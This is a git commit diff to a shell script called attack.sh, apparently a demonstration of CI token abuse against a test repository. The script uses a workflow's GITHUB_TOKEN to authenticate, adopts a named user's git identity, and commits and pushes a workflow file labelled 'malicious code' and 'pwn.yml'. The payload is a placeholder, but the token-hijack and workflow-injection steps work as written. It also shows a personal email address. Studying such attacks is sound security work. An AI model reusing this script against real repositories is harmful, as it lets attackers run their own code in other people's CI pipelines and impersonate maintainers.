e75ec2423ec7d6be5e33ea8e3df40326c8433146
analystoscar1 <164302924+analystoscar1@users.noreply.github.com>
2025-11-02 15:41:08 +0530

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -3,9 +3,9 @@ TOKEN=$GITHUB_TOKEN
 # Modify workflow to run their code on main
 git config --global user.email "shreyapohekar@gmail.com"
 git config --global user.name "shreyapohekar"
-git clone https://shreyapohekar:$TOKEN@github.com/shreyapohekar/my-dranet.git
-cd my-dranet
+git remote set-url origin https://x-access-token:$TOKEN@github.com/shreyapohekar/my-dranet.git
+git checkout -b update-from-action
 echo 'malicious code' > .github/workflows/pwn.yml
 git add .github/workflows/pwn.yml
 git commit -m "Add malicious workflow"
-git push origin main
+git push origin update-from-action
